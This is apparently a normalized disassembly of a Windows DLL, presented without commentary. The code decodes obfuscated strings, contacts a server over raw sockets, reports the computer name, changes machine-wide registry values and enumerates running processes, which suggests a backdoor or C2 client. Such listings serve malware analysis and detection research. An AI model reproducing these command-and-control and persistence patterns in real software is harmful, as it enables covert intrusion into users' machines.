mov cx [ rw-data ]
mov [ esp + 0x60 ] edx
mov dl [ rw-data ]
mov [ esp + 0x64 ] eax
mov eax [ rw-data ]
mov [ esp + 0x68 ] cx
mov ecx [ rw-data ]
mov [ esp + 0x6a ] dl
mov dl [ rw-data ]
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
mov [ esp + 0x24 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x28 ] dl
mov edx [ rw-data ]
mov [ esp + 0x6c ] eax
mov ax [ rw-data ]
mov [ esp + 0x70 ] ecx
mov [ esp + 0x74 ] edx
mov [ esp + 0x78 ] ax
mov eax [ rw-data ]
mov cl [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x54 ] eax
mov eax [ rw-data ]
mov [ esp + 0x7a ] cl
mov cx [ rw-data ]
mov [ esp + 0x50 ] edx
mov edx [ rw-data ]
mov [ esp + 0xb0 ] eax
mov eax [ rw-data ]
mov [ esp + 0x58 ] cx
mov ecx [ rw-data ]
mov [ esp + 0xac ] edx
mov edx [ rw-data ]
mov [ esp + 0x2c ] eax
mov eax [ rw-data ]
mov [ esp + 0xb4 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xb8 ] edx
mov edx [ rw-data ]
mov [ esp + 0x80 ] eax
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x7c ] edx
mov dx [ rw-data ]
lea eax [ esp + 0xcc ]
push 0x11
push eax
mov [ esp + 0x8c ] ecx
mov [ esp + 0x90 ] dx
call sub_100021a0
lea ecx [ esp + 0xc4 ]
push 0xd
push ecx
call sub_100021a0
lea edx [ esp + 0xac ]
push 0xe
push edx
call sub_100021a0
lea eax [ esp + 0x58 ]
push 0xe
push eax
call sub_100021a0
lea ecx [ esp + 0x54 ]
push 0x9
push ecx
call sub_100021a0
lea edx [ esp + 0xb4 ]
push 0x9
push edx
call sub_100021a0
lea eax [ esp + 0x44 ]
push 0x8
push eax
call sub_100021a0
lea ecx [ esp + 0x94 ]
push 0xe
push ecx
call sub_100021a0
add esp 0x40
lea edx [ esp + 0x20 ]
push 0x8
push edx
call sub_100021a0
lea eax [ esp + 0x74 ]
push 0xe
push eax
call sub_100021a0
lea ecx [ esp + 0x60 ]
push 0x9
push ecx
call sub_100021a0
lea edx [ esp + 0xc4 ]
push 0xf
push edx
call sub_100021a0
lea eax [ esp + 0x4c ]
push 0x7
push eax
call sub_100021a0
lea ecx [ esp + 0xa4 ]
push 0xd
push ecx
call sub_100021a0
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x34
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x3d4
retn
lea edx [ esp + 0x10 ]
push 0x0
push edx
push ebx
push 0x0
lea eax [ esp + 0x50 ]
push rw-data
push eax
lea ecx [ esp + 0xe4 ]
push 0x50
push ecx
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
mov edx [ esp + 0x10 ]
push edx
push ebx
call sub_100021a0
mov eax [ esp + 0x18 ]
mov ebp [ strstr@IAT ]
lea ecx [ esp + 0x3c ]
push ecx
push ebx
mov [ eax + ebx ] 0x0
call ebp
mov edx eax
add esp 0x10
test edx edx
je r-xdata
lea edx [ esp + 0x10 ]
push eax
push edx
push ebx
push eax
lea eax [ esp + 0x50 ]
push rw-data
push eax
lea ecx [ esp + 0xd4 ]
push 0x50
push ecx
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
lea ecx [ esp + 0x98 ]
lea edx [ esp + 0xe0 ]
push ecx
push edx
mov [ esp + 0xa0 ] 0x200
call [ GetComputerNameA@IAT ]
lea eax [ esp + 0x50 ]
push eax
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
xor eax eax
push 0xd
[ edi ]
not ecx
dec ecx
mov esi ecx
add esi edx
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push eax
push edx
push ebx
push eax
lea eax [ esp + 0x50 ]
push rw-data
push eax
lea ecx [ esp + 0xb4 ]
push 0x50
push ecx
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
lea edx [ esp + 0xac ]
push edx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea ecx [ esp + 0xe0 ]
push 0x1
push ecx
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
sub eax esi
jmp r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
lea ecx [ esp + 0x2c ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xe0 ]
push 0x1
push eax
lea edi [ esp + 0xb4 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
mov ecx eax
lea edi [ esp + 0x2e0 ]
mov edx ecx
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ esp + eax + 0x2e4 ] 0x0
lea eax [ esp + 0x2e4 ]
push eax
push 0x1
push rw-data
push rw-data
push 0x80000002
call [ SHSetValueA@IAT ]
mov eax 0x103
cmp eax 0x104
jb r-xdata
lea edx [ esp + 0x7c ]
push edx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push rw-data
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xe0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x20 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push rw-data
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
lea edx [ esp + 0x6c ]
push edx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea ecx [ esp + 0xe0 ]
push 0x1
push ecx
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xe0 ]
push 0x1
push eax
lea edi [ esp + 0x74 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
lea ecx [ esp + 0x5c ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xe0 ]
push 0x1
push eax
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
lea ecx [ esp + 0x8c ]
push ecx
push ebx
call ebp
push ebx
mov esi eax
call [ free@IAT ]
add esp 0xc
xor eax eax
test esi esi
pop edi
pop esi
pop ebp
pop ebx
setne al
add esp 0x3d4
retn
lea eax [ esp + 0xe0 ]
push 0x1
push eax
lea edi [ esp + 0x64 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3d4
retn
sub_10002c40
sub esp 0x2c8
push ebx
push ebp
push esi
push edi
push 0xfe
call sub_100023c0
add esp 0x4
test eax eax
je r-xdata
call sub_100021d0
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0xc4 ] eax
mov eax [ rw-data ]
mov [ esp + 0xc8 ] ecx
mov cx [ rw-data ]
mov [ esp + 0xcc ] edx
mov edx [ rw-data ]
mov [ esp + 0xd0 ] eax
mov eax [ rw-data ]
mov [ esp + 0xd4 ] cx
mov ecx [ rw-data ]
mov [ esp + 0xb4 ] edx
mov dx [ rw-data ]
mov [ esp + 0xb8 ] eax
mov eax [ rw-data ]
mov [ esp + 0xbc ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xc0 ] dx
mov edx [ rw-data ]
mov [ esp + 0xa4 ] eax
mov ax [ rw-data ]
mov [ esp + 0xa8 ] ecx
mov cl [ rw-data ]
mov [ esp + 0xac ] edx
mov edx [ rw-data ]
mov [ esp + 0xb0 ] ax
mov eax [ rw-data ]
mov [ esp + 0xb2 ] cl
mov ecx [ rw-data ]
mov [ esp + 0x38 ] edx
mov dx [ rw-data ]
mov [ esp + 0x3c ] eax
mov eax [ rw-data ]
mov [ esp + 0x40 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x44 ] dx
mov dx [ rw-data ]
mov [ esp + 0x98 ] eax
mov eax [ rw-data ]
mov [ esp + 0x9c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xa0 ] dx
mov dl [ rw-data ]
mov [ esp + 0x48 ] eax
mov eax [ rw-data ]
mov [ esp + 0x4c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x50 ] dl
mov edx [ rw-data ]
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
mov [ esp + 0x2c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x84 ] edx
mov dx [ rw-data ]
mov [ esp + 0x88 ] eax
mov eax [ rw-data ]
mov [ esp + 0x8c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x90 ] dx
mov edx [ rw-data ]
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
mov [ esp + 0x34 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x74 ] edx
mov dx [ rw-data ]
mov [ esp + 0x78 ] eax
mov eax [ rw-data ]
mov [ esp + 0x7c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x80 ] dx
mov dl [ rw-data ]
mov [ esp + 0x1c ] eax
mov eax [ rw-data ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] dl
mov [ esp + 0x64 ] eax
mov ax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x70 ] ax
mov ax [ rw-data ]
mov [ esp + 0x68 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x6c ] edx
mov edx [ rw-data ]
mov [ esp + 0x18 ] ax
mov eax [ rw-data ]
mov [ esp + 0x72 ] cl
mov cl [ rw-data ]
mov [ esp + 0x14 ] edx
mov edx [ rw-data ]
mov [ esp + 0x58 ] eax
mov [ esp + 0x1a ] cl
mov ecx [ rw-data ]
mov [ esp + 0x54 ] edx
mov dl [ rw-data ]
lea eax [ esp + 0xc4 ]
push 0x11
push eax
mov [ esp + 0x64 ] ecx
mov [ esp + 0x68 ] dl
call sub_100021a0
lea ecx [ esp + 0xbc ]
push 0xd
push ecx
call sub_100021a0
lea edx [ esp + 0xb4 ]
push 0xe
push edx
call sub_100021a0
lea eax [ esp + 0x50 ]
push 0xd
push eax
call sub_100021a0
lea ecx [ esp + 0xb8 ]
push 0x9
push ecx
call sub_100021a0
lea edx [ esp + 0x70 ]
push 0x8
push edx
call sub_100021a0
lea eax [ esp + 0x58 ]
push 0x7
push eax
call sub_100021a0
lea ecx [ esp + 0xbc ]
push 0xd
push ecx
call sub_100021a0
add esp 0x40
lea edx [ esp + 0x30 ]
push 0x7
push edx
call sub_100021a0
lea eax [ esp + 0x7c ]
push 0xd
push eax
call sub_100021a0
lea ecx [ esp + 0x2c ]
push 0x8
push ecx
call sub_100021a0
lea edx [ esp + 0x7c ]
push 0xe
push edx
call sub_100021a0
lea eax [ esp + 0x34 ]
push 0x6
push eax
call sub_100021a0
lea ecx [ esp + 0x7c ]
push 0xc
push ecx
call sub_100021a0
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x34
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2c8
retn
lea edx [ esp + 0x10 ]
push 0x0
push edx
push ebx
push 0x0
lea eax [ esp + 0x48 ]
push rw-data
push eax
lea ecx [ esp + 0xdc ]
push 0x50
push ecx
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
mov edx [ esp + 0x10 ]
push edx
push ebx
call sub_100021a0
mov eax [ esp + 0x18 ]
mov ebp [ strstr@IAT ]
lea ecx [ esp + 0xa0 ]
push ecx
push ebx
mov [ eax + ebx ] 0x0
call ebp
add esp 0x10
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push eax
push edx
push ebx
push eax
lea eax [ esp + 0x48 ]
push rw-data
push eax
lea ecx [ esp + 0xcc ]
push 0x50
push ecx
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
lea edx [ esp + 0x94 ]
lea eax [ esp + 0xd8 ]
push edx
push eax
mov [ esp + 0x9c ] 0x200
call [ GetComputerNameA@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
push rw-data
push rw-data
push 0x80000002
call [ SHDeleteValueA@IAT ]
lea edx [ esp + 0x10 ]
push eax
push edx
push ebx
push eax
lea eax [ esp + 0x48 ]
push rw-data
push eax
lea ecx [ esp + 0xbc ]
push 0x50
push ecx
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
lea ecx [ esp + 0x64 ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd8 ]
push 0x1
push eax
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
lea ecx [ esp + 0x14 ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd8 ]
push 0x1
push eax
lea edi [ esp + 0x6c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
lea edx [ esp + 0x54 ]
push edx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push rw-data
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xd8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xd8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x30 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x54 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push rw-data
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
lea edx [ esp + 0x74 ]
push edx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea ecx [ esp + 0xd8 ]
push 0x1
push ecx
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xd8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd8 ]
push 0x1
push eax
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
lea ecx [ esp + 0x84 ]
push ecx
push ebx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd8 ]
push 0x1
push eax
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
lea ecx [ esp + 0x48 ]
push ecx
push ebx
call ebp
push ebx
mov esi eax
call [ free@IAT ]
add esp 0xc
xor eax eax
test esi esi
pop edi
pop esi
pop ebp
pop ebx
setne al
add esp 0x2c8
retn
lea eax [ esp + 0xd8 ]
push 0x1
push eax
lea edi [ esp + 0x8c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_100022a0
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c8
retn
sub_100033b0
sub esp 0x33c
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi 0x2
xor ebx ebx
cmp eax edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
jne r-xdata
push 0x0
push edi
mov [ esp + 0x20 ] 0x0
call CreateToolhelp32Snapshot
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov ebp eax
cmp ebp ebx
mov [ esp + 0x10 ] ebp
je r-xdata
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
lea eax [ esp + 0x24 ]
mov [ esp + 0x24 ] 0x128
push eax
push ebp
call Process32First
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x33c
retn
mov esi [ GetProcAddress@IAT ]
push rw-data
push ebp
call esi
push rw-data
push ebp
mov ebx eax
call esi
test ebx ebx
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x33c
retn
push eax
call [ FreeLibrary@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x14c ] 0x0
cmp eax edi
jne r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x33c
retn
lea edi [ esp + 0x48 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi 0x2
mov ecx [ esp + 0x2c ]
push 0x410
push ecx
call sub_10005410
add esp 0x8
lea edx [ esp + 0x20 ]
mov esi eax
lea eax [ esp + 0x1c ]
push edx
push 0x4
push eax
push esi
call ebx
test eax eax
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push ebp
call Process32Next
test eax eax
je r-xdata
mov ecx [ esp + 0x350 ]
lea edx [ esp + 0x14d ]
push ecx
push edx
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x14c ]
push 0x200
push ecx
push edx
push esi
call [ esp + 0x24 ]
lea eax [ esp + 0x14c ]
push eax
call sub_10005590
add esp 0x4
jmp r-xdata
cmp [ rw-data ] edi
jne r-xdata
mov al [ esp + 0x14c ]
test al al
je r-xdata
mov edx [ esp + 0x2c ]
push edx
call sub_10005b80
mov ecx [ esp + 0x2c ]
push ecx
call sub_10005b30
jmp r-xdata
add esp 0x4
mov [ esp + 0x18 ] 0x1
sub_10003580
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx 0x27
xor eax eax
mov edi esi
push esi
[ edi ]
mov edi [ GetVersionExA@IAT ]
mov [ esi ] 0x9c
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
mov [ rw-data ] ax
call sub_10008e90
test eax eax
lea edx [ esi + 0x14 ]
mov edi rw-data
jne r-xdata
push esi
mov [ esi ] 0x94
call edi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn
mov edi rw-data
sub_10003600
sub esp 0x108
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push 0x1
push 0x0
push rw-data
push 0x80000001
mov [ esp + 0x20 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x108
retn
mov edx [ esp + 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push eax
push eax
push rw-data
push edx
call esi
mov edx [ esp + 0x8 ]
mov edi eax
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x0
push 0x0
push rw-data
push edx
mov [ esp + 0x24 ] 0x100
call esi
mov esi eax
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ strstr@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea esi [ esp + 0x10 ]
add esi 0x5
jmp r-xdata
push ebx
push 0x3a
push esi
call [ strchr@IAT ]
mov ebx eax
push esi
mov [ ebx ] 0x0
call sub_10004870
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc ebx
[ edi ] [ esi ]
push ebx
call [ atoi@IAT ]
add esp 0x10
mov [ rw-data ] eax
mov eax 0x1
pop ebx
pop edi
pop esi
add esp 0x108
retn
sub_10003720
mov eax 0x2120
call sub_10008f00
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x2134 ]
push edi
call sub_10004870
add esp 0x4
push eax
call [ inet_addr@IAT ]
mov ebp [ esp + 0x2138 ]
push 0x0
push 0x1
push 0x2
mov esi eax
call [ socket@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2120
retn
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x1
push eax
push 0x8004667e
push ebx
call [ ioctlsocket@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x3c
test eax eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] 0x1
je r-xdata
push ebp
mov [ esp + 0x20 ] 0x2
call [ htons@IAT ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push ebx
mov [ esp + 0x2a ] ax
mov [ esp + 0x2c ] esi
call [ connect@IAT ]
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push edx
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push 0x0
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
push rw-data
call [ inet_addr@IAT ]
mov ebp [ rw-data ]
mov esi eax
push ebx
mov ebp [ esp + 0x2144 ]
mov edx [ esp + 0x2150 ]
mov eax [ esp + 0x213c ]
mov ecx [ esp + 0x2138 ]
push ebp
push edx
push eax
push ecx
lea edx [ esp + 0x140 ]
push edi
push edx
call sub_100043e0
lea edi [ esp + 0x148 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
mov esi [ esp + 0x2140 ]
dec ecx
mov eax ecx
mov ecx ebp
mov edx ecx
push 0x0
lea edi [ esp + eax + 0x134 ]
add eax ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
lea eax [ esp + 0x138 ]
and ecx 0x3
push eax
push ebx
[ edi ] [ esi ]
call [ rw-data ]
cmp [ esp + 0x2150 ] 0x1
jne r-xdata
push ebx
call sub_100046a0
add esp 0x4
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
push ecx
push 0x0
push edx
lea eax [ ebx + 0x1 ]
push 0x0
push eax
call [ select@IAT ]
test eax eax
push ebx
jle r-xdata
cmp eax 0x3e800
jge r-xdata
call [ closesocket@IAT ]
call [ closesocket@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2120
retn
mov edi [ esp + 0x2148 ]
mov ebp [ recv@IAT ]
xor esi esi
mov edx 0x3e800
push 0x0
sub edx esi
lea eax [ esi + edi ]
push edx
push eax
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push ebx
call [ closesocket@IAT ]
mov ecx [ esp + 0x214c ]
pop edi
mov eax 0x1
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
add esp 0x2120
retn
add esi eax
cmp esi 0x3e800
jl r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push eax
push 0x0
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
sub_10003950
push ecx
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
mov [ esi + 0x4 ] 0x50
mov [ esi + 0x6 ] 0x51
mov [ esi + 0x8 ] 0x52
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
